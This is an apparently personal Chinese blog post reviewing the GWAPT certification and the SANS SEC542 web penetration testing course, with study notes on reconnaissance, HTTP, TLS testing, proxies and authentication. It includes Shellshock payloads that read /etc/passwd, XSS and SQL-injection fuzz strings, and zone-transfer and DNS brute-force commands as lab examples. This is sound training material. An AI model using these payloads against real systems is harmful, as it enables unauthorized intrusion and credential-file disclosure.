<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>GWAPT认证考试总结</title>
    <url>/zh-CN/bef99fab/</url>
    <content><![CDATA[<p>最终以91%的分数通过GWAPT考试</p>
<span id="more"></span>


<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="课程简介"><a href="#课程简介" class="headerlink" title="课程简介"></a>课程简介</h2><p>SEC542 课程的主旨是帮助学生可以不仅限于对Web Application进行”一键扫描”，而是可以对于一些重要的Web Application进行更加专业、彻底的渗透测试。</p>
<p>在整个课程的过程中，学生可以学习如何评估一个Web Application的安全状态，并可以具有说服力地阐述攻击者通过对已发现的漏洞的利用可以产生怎么样的业务影响。除了授课的内容之外，SEC542还提供了许多实验环境，可以让学生立刻将课程中学习到的知识应用于实践。</p>
<p>总结起来，通过这门课程，可以学习到：</p>
<ul>
<li>可反复应用在高价值的渗透测试中的方法论</li>
<li>如何去发现并利用一个Web Application中的关键缺陷</li>
<li>如何来阐述一个Web Application的漏洞可能造成的影响</li>
<li>Web Application安全对于系统整体安全状况的重要性</li>
<li>如何更高效地使用Web Application攻击工具</li>
<li>如何撰写一份Web Application渗透测试报告</li>
</ul>
<p>在学习完SEC542课程，通过 GWAPT 考试后，学生能够：</p>
<ul>
<li>将OWASP标准的测试步骤应用在Web Application的渗透测试中，以此来确保每一次的渗透测试都可以满足一致性，可复制性，严谨程度以及质量要求</li>
<li>分析从自动话测试工具中得到的结果，以验证发现，确定其对业务的影响并消除误报</li>
<li>手动发现Web应用程序的关键缺陷。</li>
<li>在渗透测试期间，使用Python创建测试和利用脚本。</li>
<li>发现并利用SQL Injection漏洞，以此来确定受害组织的真实风险。</li>
<li>使用ysoserial和类似工具来理解和利用不安全的反序列化漏洞。</li>
<li>创建配置并测试其他类型的Web攻击中的有效负载。</li>
<li>对潜在的注入攻击进行Fuzz测试。</li>
<li>解释利用Web应用程序漏洞可能造成影响。</li>
<li>使用诸如Zed Attack Proxy和BurpSuite Pro之类的工具分析客户端与服务器应用程序之间的流量，以发现客户端应用程序代码中的安全问题。</li>
<li>手动发现和利用跨站点请求伪造（CSRF）攻击。</li>
<li>使用浏览器利用框架（BeEF）来hook被攻击的浏览器，攻击客户端软件和网络，并评估XSS漏洞对应用程序的潜在影响。</li>
<li>执行两次完整的网络渗透测试，一次在课程教学的五天内进行，另一次在“CTF”练习中进行。</li>
</ul>
<p>SANS SEC542这门课程对应的证书是 GIAC Web Application Penetration Tester (GWAPT)。 这个证书在全球范围内还是很有分量的，在国内相对来说不是那么的广为人知。从课程的角度来说，SANS的课程是非常优秀的。但是GWAPT考试的形式是2个小时的选择题。这种考试形式相比于OSCP这种更注重于实操的证书而言，相对就不是那么的具有含金量了。当然还有另外一个很重要的原因：SEC542真的很贵！！！</p>
<p>至于说我是不是推荐这门课程呢… 考虑到价格因素的话，我不推荐个人来报名这门课程。如果公司可以报销这笔培训费用，从职业发展角度，又比较期望在外企发展的话，那这个证书还是非常值得花时间去考一下的。毕竟在外企，这个证书的认可度还是非常高的。</p>
<h2 id="课程报名注册"><a href="#课程报名注册" class="headerlink" title="课程报名注册"></a>课程报名注册</h2><p>SEC542这门课，可以通过SANS官网直接报名。大多数SANS的课程应该是以线下的形式进行授课，但是由于在中国SANS暂时没有提供线下授课的场所，而今年由于疫情的影响，即便在国外，很多线下课程也很难展开。所以对于SEC542这门课，SANS同时也提供了Live Online的版本，适应于不同的时间与地区。可惜的是，这些时间对于中国而言，大多数都不是非常友好。而且，实际工作的过程中，也很难真正抽出一个礼拜，每天八个小时地来参加培训。所以最后我还是选择了OnDemand的模式。OnDemand模式采用的是录像的方式，没有讲师实时进行授课。但好处是，参加课程的同学可以比较自由的安排培训的时间，只要在4个月的时间段内，根据自己的需求，安排学习计划即可。当然，由于没有讲师实时授课，所以会缺少与讲师的互动。如果在课程过程中遇到问题，只能通过邮件的方式进行咨询。（当然，这种对于中国学生来说或许不算太大的问题）</p>
<p>注册其实很简单，就付钱就好了。SANS各种付款方式都支持的。但是使用信用卡网络付款的话，SANS对账单地址的检查非常严格。如果有错的话，支付非常容易不通过。我就遇到了类似的问题，最后打美国的客服电话，在线支付才完成的。</p>
<p>一个bundle中包括了SEC542的培训，2次考试模拟以及最终认账测试，还有书面教材邮寄的费用。当然，费用属实非常贵……</p>
<p><a href="price.jpg">price of SEC542</a></p>
<h2 id="课程先期准备"><a href="#课程先期准备" class="headerlink" title="课程先期准备"></a>课程先期准备</h2><p>完成注册后，进入课程目录，总共有3份可下载的文档：</p>
<p><a href="handouts.jpg"></a></p>
<ul>
<li>My Labs<br>这是一份实验环境连接的说明文档。因为在课程过程中的第六个部分，我们需要完成一个”CTF”练习。 在练习前，我们需要对网络进行适当的配置，这样才能顺利地通过VPN连接到实验环境。</li>
<li>Quick Start Guide<br>课程地快速上手指南。这算是一份归纳文档，针对刚完成报名的同学，简单整理了一下比较常见的问题：有哪些课程相关的材料，如何开始课程，如何与SANS的客服联系等等…</li>
<li>VMware Software License Handout<br>SANS随课程还提供了VMware一年期的license。好东西!跟着这份文档操作就可以获取并且激活。</li>
</ul>
<p>除此之外，还有一系列多媒体文件可以下载：</p>
<ul>
<li>虚拟机的镜像文件</li>
<li>课程的MP3录音</li>
<li>SANS一些与渗透测试相关的印刷品。包含了一些工具的Cheatsheet。还算制作精美</li>
<li>课程完整讲义的电子版</li>
</ul>
<p>课程的讲义会通过邮寄的方式发送给我们。不知道是不是因为疫情的原因，邮寄的周期比较长，可能会要1-2周。<br><strong>讲义对于考试来说还是非常有用的。因为是开卷考试，有不少题目涉及到的知识点也可以在讲义中找到。所以在考试前一定要熟悉各个考点在讲义中出现的位置。</strong></p>
<h1 id="SEC542课程学习"><a href="#SEC542课程学习" class="headerlink" title="SEC542课程学习"></a>SEC542课程学习</h1><h2 id="网课界面"><a href="#网课界面" class="headerlink" title="网课界面"></a>网课界面</h2><p>SANS的ONDEMAND课程的界面功能还是比较强大的。毕竟收了这么多钱，倒也不是白花的<br><a href="course_UI.jpg"></a></p>
<p>课程的整体语速还是非常友好的。对于英语环境比较习惯的 可以尝试在某些部分使用1.2倍速播放。</p>
<h2 id="时间安排"><a href="#时间安排" class="headerlink" title="时间安排"></a>时间安排</h2><p>由于有一定的时间限制，所以这次从报名到考试的完整周期在一个月之内。网课我基本在三周内全部完成，包括网课中相关的实验课程。最后留一周的时间完成模拟题，熟悉讲义，回顾所有的知识点。</p>
<p>至于说从准备开始到考试究竟留多长时间合适，这完全取决于每个人的情况。首先是在渗透测试方面的基础，如果本来就或多或少了解渗透测试，甚至有参与过渗透测试的话，那这门课程学习的难度就相对较小，整个课程听下来应该会非常顺利，不需要耗费太多的时间去理解课程的知识。还有就是每天可以用于SEC542的时间是多少。所以整个备考的天数也是因人而异的， 建议先开始课程，有一个大致的预估后，再预约考试时间。</p>
<h2 id="课程实验"><a href="#课程实验" class="headerlink" title="课程实验"></a>课程实验</h2><p>SEC542提供了一个虚拟机镜像作为课程的实验环境。任何时候，对于渗透测试的技能来说，实验的靶机永远都是比课程讲义更有价值的学习工具。很多是后就是靠着不断的练习操作，来积累经验，不断学习。<br>但是反过来说，对于GWAPT考试而言，实验环境的内容可能就显得没有那么重要了。不过，我相信如果会报名这个课程的，一定不会仅仅是为了获得一个证书吧。肯定还是希望在实际的操作上获得一定的提升的。</p>
<h1 id="考试准备"><a href="#考试准备" class="headerlink" title="考试准备"></a>考试准备</h1><p>应对考试，首先我们需要针对考试的类型进行复习。 </p>
<p>GWAPT考试采用单项选择题的方式，总共75道题，时间限制为2个小时。GWAPT的考试属于是开卷考试，考生可以使用课程讲义以及一张A4纸大小的”小抄”作为参考资料。一般建议把小抄作为索引，然后可以通过这种方式快速地在讲义中定位到相关知识点。题目的难度其实相对来说不算很大，大多数题目都可以在讲义中找到。只需要简单的理解就可以了。总体而言，我认为通过考试应该不算是一件很难的事情。</p>
<h1 id="Section-1-Introduction-and-Information-Gathering"><a href="#Section-1-Introduction-and-Information-Gathering" class="headerlink" title="Section 1: Introduction and Information Gathering"></a>Section 1: Introduction and Information Gathering</h1><h2 id="Why-the-Web"><a href="#Why-the-Web" class="headerlink" title="Why the Web?"></a>Why the Web?</h2><p>这一部分算是课程的前言，主要是一些背景铺垫。讲师自己的背景介绍，Web Application的历史背景，Web Application安全的发展过程，以及现状等等。</p>
<p>重点在于，现在大多数企业的测试更加侧重于业务的功能，而极少数会将大量的时间花费在安全测试之上。如果我们可以收到一些关于漏洞的报告，我们可以更加清楚地认识到安全测试缺失地问题是非常严重的。<br>虽然现在很多公司都有意识地进行渗透测试，但是其实渗透测试的质量参差不齐。许多第三方的渗透测试公司提供的渗透测试质量都非常的低下，这与测试者的能力也紧密相关。</p>
<h2 id="Application-Assessment-Methodologies"><a href="#Application-Assessment-Methodologies" class="headerlink" title="Application Assessment Methodologies"></a>Application Assessment Methodologies</h2><ul>
<li><p>Black Box, White Box, Gray Box.<br>黑盒测试表示没有任何目标系统的信息，而白盒测试则是可以获得关于目标系统的全部信息。 灰盒则介于两者之间。颜色越深则代表测试者可以获得的信息越少。</p>
</li>
<li><p>SAST (Static Application Security Testing)<br>大多数时候指代码审计</p>
</li>
<li><p>DAST （Dynamic Application Security Testing) &amp; Push Button Pentesting<br>没有获取源代码的权限，通过运行及与应用程序交互来寻找可能存在的漏洞。自动化工具在DAST中扮演了非常重要的角色。 但一键扫描这样的工具并没有看起来的这么有效，作为渗透测试工程师，深入理解自动化工具具体在做什么是很重要的。这样才能完成一个更有价值的渗透测试。</p>
</li>
</ul>
<p>Web Application的渗透测试与传统的针对服务器的渗透测试有一些不同。针对服务器的渗透测试在整个过程中，一步一步都非常明确。但对于Web Application的渗透测试而言，这样的步骤可能不完全适用。Web Application的渗透测试过程中，我们一般在发现漏洞后就会立刻想办法进行利用，而不会很明确地将漏洞发现以及漏洞利用明确地分割为两个阶段。</p>
<p>OWASP - Top10</p>
<p>OTG - OWASP Testing Guide is followed in this course. </p>
<h2 id="Course-Logistics"><a href="#Course-Logistics" class="headerlink" title="Course Logistics"></a>Course Logistics</h2><p>这一章节简单介绍了一下实验环境的构建。如何配置、使用SANS提供的虚拟机。跟着做就可以了。</p>
<h2 id="Web-Application-Pen-Tester’s-Toolkit"><a href="#Web-Application-Pen-Tester’s-Toolkit" class="headerlink" title="Web Application Pen Tester’s Toolkit"></a>Web Application Pen Tester’s Toolkit</h2><ul>
<li><p>Acunetix Vulnerability Scanner</p>
</li>
<li><p>Burp Scanner</p>
</li>
<li><p>Fortify WebInspect</p>
</li>
<li><p>IBM AppScan</p>
</li>
<li><p>Qualys WAS</p>
</li>
<li><p>Rapid7 AppSpider</p>
</li>
<li><p>Veracode Dynamic Analysis</p>
</li>
<li><p>Whitehat Sentinel</p>
</li>
<li><p>ZAP Scan</p>
</li>
<li><p>What’s intercept proxy (Burp and ZAP)</p>
</li>
<li><p>Browsers<br>在渗透测试中，我们希望使用”不安全“的浏览器。这样，浏览器不会自动拦截一些例如XSS的显示，造成渗透测试的错误结果。<br>所以，一般会选择Firefox或者Chromium.</p>
</li>
</ul>
<h2 id="WHOIS-and-DNS"><a href="#WHOIS-and-DNS" class="headerlink" title="WHOIS and DNS"></a>WHOIS and DNS</h2><p>WHOIS </p>
<ul>
<li>TCP port 43</li>
<li>Have Name(s) and phone number(s) and physical address and DNS servers</li>
<li>DNS information is most valuable to Web Application 渗透测试</li>
<li>现在许多WHOIS记录由于GDPR的要求，已经将许多个人信息删减了</li>
</ul>
<p>DNS</p>
<ul>
<li><p>使用UDP 53端口： 小于512bytes的负载</p>
</li>
<li><p>使用TCP 53端口：大于512bytes的负载，<strong>Zone Transfer区域传送</strong> </p>
</li>
<li><p>Zone Transfer<br>区域转移不应该被配置为可以公开, 不然攻击者可以非常容易地获取到内网的网络拓扑信息。dig xxx IXFR<br>当区域转移被禁用后，可以尝试reverse DNS(PTR) 或者 DNS爆破的方法来发现一些隐藏的子网。<br>PTR -&gt; 从IP反查域名， 获取目标域名的IP地址，对同一子网的其他IP地址进行PTR反查<br>DNS爆破一般使用字典爆破</p>
</li>
</ul>
<p>Tools：</p>
<ul>
<li><p>nslookup</p>
</li>
<li><p>dig</p>
</li>
<li><p>NMap</p>
</li>
<li><p>DNSRecon</p>
</li>
<li><p>Metasploit</p>
</li>
<li><p>nslookup<br>通常对DNS的利用从nslookup开始，这个命令在多种平台都适用。如果刚入侵了某一台服务器，那么nslookup也有非常大的可能性能在那台机器上运行。</p>
</li>
<li><p>dig<br>dig是一款功能强大的DNS客户端。在MacOS和大多数的UNIX&#x2F;Linux系统上都自带dig。</p>
</li>
</ul>
<p>dig @ip version.bind chaos txt</p>
<ul>
<li><p>Nmap DNS NSE scripts<br>dns-brute.nse 在搜索CNAME的时候非常有用。</p>
</li>
<li><p>DNSRecon</p>
</li>
<li><p>Metasploit<br>auxiliary&#x2F;gather&#x2F;dns_bruteforce</p>
</li>
</ul>
<p>Lab - DNS Harvesting<br>使用dig搜索域名解析所有的记录<br><code> dig [domain] -t any</code></p>
<p>尝试进行Zone Transfer (区域转移)<br><code> dig [domain] -t  axfr</code><br><code>dnsrecon.py -a -d [domain]</code><br><code>nmap --script=dns-zone-transfer [domain]</code></p>
<p>使用Nmap进行DNS爆破扫描<br><code>nmap --script=dns-brute [domain]</code><br>（对于限制了Zone Transfer的DNS服务，可以尝试进DNS爆破来获取信息）</p>
<p>使用DNSrecon来进行DNS爆破扫描<br><code>dnsrecon.py -d  [domain] -t brt -D [wordlist]</code><br>默认wordlist 为dnsrecon路径下的namelist.txt</p>
<p>metasploit的gather&#x2F;enum_dns模块也可以完成相同的工作。</p>
<h2 id="OSINT-（Open-Source-INTelligence"><a href="#OSINT-（Open-Source-INTelligence" class="headerlink" title="OSINT （Open Source INTelligence)"></a>OSINT （Open Source INTelligence)</h2><p>进行渗透测试时要尽可能得多获取关于目标公司的信息，这些信息都会最终帮助到渗透测试。 </p>
<p> 对于in-house （甲方） 的渗透测试，这部分可能看起来不是那么重要。 但是信息搜集技巧通常可以发现很多意想不到的收获。 （Github，Job posting，…）</p>
<ul>
<li><p>Google Search Operation<br> “” 精确匹配<br> site:<br> cache:   在cache中搜索<br> ext: 精确找到页面后缀<br> filetype: 精准找到文件后缀<br> Intitle:, inurl:  在页面标题和url中搜索关键词</p>
</li>
<li><p>Google dorks<br> <a href="https://exploit-db.com/google-hacking-database">Google Hacking Database(GHDB)</a> 中可以查到相关的Google dork语句。</p>
</li>
<li><p>Cached Content<br>通过 archive.org 甚至有可能搜索到十多年前的页面记录。<br><strong>从互联网中删除一个存在过的内容并不是一件简单的事情</strong></p>
</li>
<li><p><a href="https://www.shodan.io/">Shoadan</a><br>通过shodan可以搜索到各种连接网络的计算机，服务器，IOT…</p>
</li>
<li><p>Social Media (LinkedIn)<br>通过这类社交媒体，可能可以获取到员工的邮件地址，VPN用户名等等。</p>
</li>
<li><p>Metadata<br>多媒体文件中包含的信息</p>
</li>
</ul>
<p><code>exiftool [filename]</code></p>
<ul>
<li><p>Tesseract<br>自动识别、提取图片、PDF 中的文字信息</p>
</li>
<li><p>FOCA<br>运行在Windows上的免费软件，爬取域名中的各种文件，并分析其中包含的Metadata。<br>文件的作者可能包含用户信息。</p>
</li>
<li><p>Maltego<br>商业软件，将OSINT可能需要用到的步骤都包含了进去。</p>
</li>
<li><p>SpiderFoot<br>免费软件。 某些功能需要外部API的权限（外部网站的升级账号）</p>
</li>
<li><p>theHarvester<br>命令行工具，<br><code> theharvester -d sans.org -b all -f sans.html</code> </p>
</li>
<li><p>AutOSINT</p>
</li>
</ul>
<p>实验：</p>
<ul>
<li><a href="https://transparencyreport.google.com/https/certificates">https://transparencyreport.google.com/https/certificates</a></li>
<li><a href="https://crt.sh/">https://crt.sh</a><br>通过这两个网站，可以看到某个域名下所有注册过证书的子域名。通过这两个网站，也可以发现一些有意思的子域名，平台入口，<strong>攻击面</strong>！！</li>
</ul>
<h2 id="HTTP-Syntax-and-Messaging"><a href="#HTTP-Syntax-and-Messaging" class="headerlink" title="HTTP Syntax and Messaging"></a>HTTP Syntax and Messaging</h2><ul>
<li><p>HTTP&#x2F;0.9<br> 仅支持GET。只返回HTML文本。至今很多现代的web服务器任然支持HTTP&#x2F;0.9</p>
</li>
<li><p>HTTP&#x2F;1.0<br> 支持了GET, HEAD. 也描述了POST, PUT, DELETE</p>
</li>
<li><p>HTTP&#x2F;1.1<br> 现在正在使用的</p>
</li>
<li><p>HTTP&#x2F;2<br> 主要是为了提升性能。<br> 可以允许Server向Client推送消息。压缩成为二进制协议。Header也压缩为二进制来缩小非有效的数据。</p>
</li>
</ul>
<p> QUIC （Quick UDP Internet Connections)<br> 本质上是基于UDP的HTTP&#x2F;2</p>
<p><strong>Semantics描述了请求与响应是如何交换信息的： 比如HTTP方法，状态码，HTTP头信息等。Syntax是描述Semantic是如何在网络上传输。</strong></p>
<h2 id="HTTP-Semantics"><a href="#HTTP-Semantics" class="headerlink" title="HTTP Semantics"></a>HTTP Semantics</h2><ul>
<li><p>第一行： HTTP 方法（动作），URI，HTTP版本</p>
</li>
<li><p>HTTP方法<br>安全方法（不会修改页面状态）： GET, HEAD, OPTIONS<br>不安全方法： POST， PUT，DELETE</p>
</li>
<li><p>GET<br>没有payload，body中没有数据<br>不适合用来传递需要保密的信息(e.g.密码)</p>
</li>
</ul>
<p> 可以尝试将POST更换成GET来绕过一些防护措施</p>
<ul>
<li><p>HEAD<br> 仅返回头部信息，没有body的内容。可以提高效率，针对一些相应的头部内容进行测试。</p>
</li>
<li><p>TRACE<br> 被设计用来查错，不应该在生产环境中启用。</p>
</li>
<li><p>OPTIONS<br> 服务器返回可接受的所有HTTP方法。但是没什么大用，直接测试服务器一般也会返回405或者501. </p>
</li>
<li><p>User-Agent<br>对于大多数正常的用户，这里的值应该是浏览器的版本信息 （但有时候也会泄露一些版本信息）<br>有时候也会显示攻击者使用的工具名称</p>
</li>
<li><p>Referer<br>有时候web Application会检查这个值确保用户遵照了正确的流程。但是这个值是可以更改的…</p>
</li>
</ul>
<p>HTTP响应</p>
<ul>
<li>Server<br>对应USer-Agent ，泄露版本信息</li>
</ul>
<h2 id="HTTPS-and-Testing-for-Weak-Ciphers"><a href="#HTTPS-and-Testing-for-Weak-Ciphers" class="headerlink" title="HTTPS and Testing for Weak Ciphers"></a>HTTPS and Testing for Weak Ciphers</h2><p>测试SSL&#x2F;TLS弱加密算法</p>
<ul>
<li>Nmap NSE <code>ssl-enum-ciphers</code><br>对算法强度进行A-F的评分</li>
</ul>
<p> Qualys SSL Labs<br><a href="https://www.ssllabs.com/ssltest">https://www.ssllabs.com/ssltest</a><br>可以通过这个网址来测试目标地址的SSL证书强健度</p>
<p>一般对于在公开的域名，我们可以使用Qualys的工具进行测试。但有时候，我们需要进行内网渗透测试，这种情况下，就需要使用nmap工具来完成HTTPS 加密算法强度的测试。</p>
<p>NMap中 <code>ssl-enum-ciphers</code>脚本的原理是逐个使用所有的加密算法，与目标域名进行连接。通过这种方法来确定服务器接收的所有加密方式。</p>
<p>Nmap脚本的分数没有将协议的支持（是否允许SSL, TLS 1.0等) 纳入分数计算。其他评分标准与SSL Lab一致。</p>
<p>Heartbleed Lab<br><code>nmap -sV --script ssl-heartbleed [domain]</code><br>可以使用Nmap对网站的端口进行扫描，检查是否存在Heartbleed漏洞</p>
<h2 id="Interception-Proxies"><a href="#Interception-Proxies" class="headerlink" title="Interception Proxies"></a>Interception Proxies</h2><ul>
<li><p>ZAP<br>ZAP的fuzzer非常强大<br>（免费工具，适合介绍给Application team使用）</p>
</li>
<li><p>Brup Suite<br>渗透测试工程师最喜欢的工具之一</p>
</li>
</ul>
<p>Scope设置：非常重要，限制扫描的范围，以免越过界限，进入到不在渗透测试范围的网络应用。</p>
<ul>
<li><p>Intercept<br>最重要的功能之一</p>
</li>
<li><p>Intruder<br>Fuzz功能</p>
</li>
<li><p>Repeater<br>将请求细微更改后反复发送到服务器，观察响应的区别</p>
</li>
<li><p>Sequencer<br>可以用来观察Web Application的session是否足够随机，难以预测。</p>
</li>
<li><p>Decoder<br>非常实用的工具来编码，反编码，计算哈希值。</p>
</li>
<li><p>Comparer<br>比较两个不同的请求，并且发现不同。</p>
</li>
<li><p>Extender<br>可以安装BApp插件或者是自定义插件来完成预设功能不能完成的工作</p>
</li>
</ul>
<h1 id="Configuration-Identity-and-Authentication-Testing"><a href="#Configuration-Identity-and-Authentication-Testing" class="headerlink" title="Configuration, Identity, and  Authentication Testing"></a>Configuration, Identity, and  Authentication Testing</h1><h2 id="Target-Profiling"><a href="#Target-Profiling" class="headerlink" title="Target Profiling"></a>Target Profiling</h2><p>了解服务器已经中间件的软件、版本信息有助于更好的对网络应用进行测试，以及利用漏洞。</p>
<ul>
<li>Port scanning</li>
</ul>
<p>端口扫描可以发现没有运行在80，443端口上的网络应用。收集端口背后运行的软件信息，查看是否存在漏洞<br><code>nmap -sV</code><br>version scan</p>
<ul>
<li><p>Zenmap<br>nmap的图形界面版本</p>
</li>
<li><p>Shodan<br>不仅仅是一个OSINT工具，可以在shodan上查看到版本信息</p>
</li>
<li><p>Netcraft Sitereport<br>可以看到Web服务器的历史配置数据<br>经常发生：开发人员转移了网站但不删除旧的网络应用</p>
</li>
<li><p>Application Infrastructure<br>记录所有之前步骤发现的Web应用相关组件。通过相关的详细信息查找对应的组件是否存在相应的漏洞<br>( 中间件，应用框架，CMS，数据库，其他的网络服务SSH,FTP,RDP)</p>
</li>
<li><p>测试HTTP方法 （OTG-Config-006)<br>robots.txt 包含了网络管理员不希望网络爬虫爬取的路径，但这些路径往往是渗透测试时我们所感兴趣的路径</p>
</li>
</ul>
<p>Lab:</p>
<ul>
<li><p>使用Netcat来对 <a href="http://www.sec542.org/">http://www.sec542.org</a> 发出 HTTP 1.0 的 HEAD请求</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line">echo -e <span class="string">&quot;<span class="keyword">HEAD</span> / http/1.0\r\n\r\n&quot;</span> | nc www.sec542.org <span class="number">80</span></span><br></pre></td></tr></table></figure>
<p>往往使用HTTP&#x2F;1.0是因为这是最简单的请求，不需要加上Host；同时还可以看服务器是否正确返回HTTP&#x2F;1.1</p>
</li>
<li><p>换使用Netcat来对 <a href="https://www.sec542.org/">https://www.sec542.org</a> 发出 HTTP 1.0 的 HEAD请求</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line">echo -e <span class="string">&quot;<span class="keyword">HEAD</span> / http/1.0\r\n\r\n&quot;</span> | nc www.sec542.org <span class="number">443</span></span><br></pre></td></tr></table></figure>
<p>因为没有使用证书，所以服务器会返回400 错误。但是这里我们更关注的HTTP头中的信息。 </p>
</li>
<li><p>使用Nmap对 <a href="http://www.sec542.org进行一次版本扫描/">www.sec542.org进行一次版本扫描</a></p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">nmap -sV www.sec542<span class="meta">.org</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用Nmap的NSE脚本，分析<a href="http://www.sec542.org/">http://www.sec542.org</a> 的robots.txt文件</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">nmap <span class="attr">--script</span>=http-robots<span class="selector-class">.txt</span> www<span class="selector-class">.sec542</span>.org</span><br></pre></td></tr></table></figure></li>
</ul>
<p>可以在<code>/usr/local/share/nmap/scripts</code>下查看所有的NSE脚本</p>
<h2 id="Shellshock"><a href="#Shellshock" class="headerlink" title="Shellshock"></a>Shellshock</h2><ul>
<li>软件配置缺陷<br>Nikto可以用来是扫描这一类漏洞<br>不是最让人感觉兴奋的漏洞，但往往会包含在渗透测试的范围之内，而且也同样非常重要。</li>
</ul>
<p>Injection: </p>
<ul>
<li>() { 42;};echo;&#x2F;bin&#x2F;cat &#x2F;etc&#x2F;passwd</li>
<li>() { 42;};echo;&#x2F;usr&#x2F;bin&#x2F;id</li>
</ul>
<p>把CGI环境变量HTTP_USER_AGENT的值设置为上面的payload.</p>
<h2 id="Insufficient-Logging-and-Monitoring"><a href="#Insufficient-Logging-and-Monitoring" class="headerlink" title="Insufficient Logging and Monitoring"></a>Insufficient Logging and Monitoring</h2><p>这一项被加入到了最新的OWASP Top10中。<br>这一部分在实际生产中是非常不足的，数据泄露发现的平均时间是191天。攻击者往往在成功前已经有多次尝试，所以monitoring是非常重要的。</p>
<p>但SOC实际运行起来困难很大，人才大多比较年轻，很难正确做出判断。公司也往往不愿意在SOC或者Blue Team上投入非常多，相较而言，公司更愿意在顶级的Red Team和渗透测试上花费。</p>
<p>需要在多方面记录日志：</p>
<ul>
<li>Web Servers</li>
<li>Database servers</li>
<li>Authentication Systems</li>
<li>WAF and LB</li>
<li>Web Application 本身</li>
</ul>
<p>一定需要发现的事件：</p>
<ul>
<li>失败和成功的身份验证 （如果有人运行了一个身份登录爆破，但系统却发现不了，没有报警：不可接受）</li>
<li>敏感数据的操作、读取</li>
<li>服务器端验证失败的错误信息</li>
</ul>
<p>使用SIEM来集中化管理日志。</p>
<ul>
<li>高风险的安全事件需要可以触发警报</li>
<li>低风险的事件需要可以通过报告以及展示板来显示<br>-可以防止日志被删除或者篡改</li>
<li>确保所有日志的时间同步，并使用UTC作为时区格式</li>
</ul>
<p>测试事件响应的流程</p>
<ul>
<li>经常性进行演习</li>
<li>通过渗透测试检查Blue Team是否可以顺利发现攻击</li>
</ul>
<h2 id="Spidering-Web-Application"><a href="#Spidering-Web-Application" class="headerlink" title="Spidering Web Application"></a>Spidering Web Application</h2><p>目标是发现在Web Application中存在的所有链接.<br>robots.txt 是公开的，不应该使用robots.txt来隐藏敏感的路径和内容。相反，攻击者往往会使用robots.txt中的路径最为攻击点</p>
<table>
<thead>
<tr>
<th>人工爬取</th>
<th>自动化爬取</th>
</tr>
</thead>
<tbody><tr>
<td>慢，人来操作</td>
<td>快速，多线程</td>
</tr>
<tr>
<td>可以在比较敏感或者关键的功能上使用</td>
<td>有可能会造成一定程度的破坏</td>
</tr>
<tr>
<td>可以理解应用程序的功能和流程</td>
<td>可以定位到应用大多数需要的输入</td>
</tr>
<tr>
<td>可以发现并当即尝试利用</td>
<td>同时获取大量的信息，然后需要继续用自动化工具处理信息</td>
</tr>
</tbody></table>
<p>结合两种爬取方式：<br>人工： 记录下Web应用中的重要功能（文件上传等），关系到数据库的查询操作，跟踪输入的数据<br>自动化： 知道自动化的目的，使用Burp和ZAP中的被动扫描</p>
<p><code>wget -r</code>可以用作命令行爬虫工具。 </p>
<p><code>wget -r [domain] -P /dir</code> </p>
<p><code>cewl</code> 工具可以通过网站爬取关于网站的关键词。可以用于构造定制化的字典</p>
<p>Wappalyzer 工具可以用来获取Web Application 的组件信息</p>
<p>分析爬虫获取到的结果： 对于爬取到的链接中的页面内容，可以重点关注一些关键的功能，代码中的注释，禁用的功能还有隐藏的链接</p>
<p>Lab<br>Burp<br>设置范围: <code>.*?sec542.org$</code> </p>
<h2 id="Forced-Browsing"><a href="#Forced-Browsing" class="headerlink" title="Forced Browsing"></a>Forced Browsing</h2><p>通过字典攻击的方式，发现没有与其他内容互相连接的内容。<br>Burp -&gt; Engagement tools -&gt; Discover Content</p>
<h2 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h2><p> Fuzzing 指将提交给Web Application的正常输入替换成一些试图利用漏洞或者猜测用户身份的输入<br> 常见的如<code>&lt;script&gt;alert(42)&lt;/script&gt;</code> 和 <code>&#39; or 1=1 #</code> 之类的<br> 而且几乎可以应用在任何地方：  请求的头部，POST参数， GET参数， PUT负载…</p>
<p> Seclist 包含了许多高质量的Web应用渗透测试可能用到的Fuzzing内容<br> SEC542 VM 中 <code>/opt/seclists</code><br> <a href="https://github.com/danielmiessler/seclists">https://github.com/danielmiessler/seclists</a></p>
<h2 id="Information-Leakage"><a href="#Information-Leakage" class="headerlink" title="Information Leakage"></a>Information Leakage</h2><p>这一类漏洞通常不可以被直接利用，但缺会对渗透测试或者是攻击者提供非常一些非常有用的信息。<br>通过这种途径获得的信息往往会被用在之后的攻击&#x2F;利用过程中。</p>
<p>Directory Browsing<br>快速对Apache&#x2F;Nginx测试： 尝试访问image所在的路径</p>
<p>Google Search来查找Directory Browsing<br><code> site:gov intitle:&quot;Index of&quot; &quot;last modified&quot;</code> </p>
<p> Automatically discovery:<br> Nikto, w3af( powerful but buggy), ZAP’s force browse, Metasploit’s WMAP</p>
<h2 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h2><p>HTTP Basic Authentication<br>非常老的认证协议，服务器会发送一个名为Realm的参数，描述对被保护的资源进行描述。<br>用户认证信息被保存在服务器上。（Apache存在.htaccess 文件中）</p>
<p>传输时将用户名密码对进行Base64编码后传输到服务器。没有加密<br>缺点： 无法登出，登录后的每个请求都包含有身份认证的信息（都是base64编码的）。无法锁定账户</p>
<p>Digest Authentication<br>对Basic认证方式的改进，不再直接传输密码，但是依旧是可以破解的…</p>
<p>Windows Integrated Authentication<br>使用了NTLM加密，可以被破解</p>
<p>Form-based<br>现在最常用的认证方式，主要分为三个部分： 客户端的用户身份认证表单， 服务器端的身份认证处理代码，需要认证后才能访问到的资源<br>安全性取决于开发者如何开发。应用程序需要能够正确地处理Session，账号锁止机制同样取决于开发者如何开发</p>
<p>OpenId&#x2F;OAuth&#x2F;SAML<br>？？？</p>
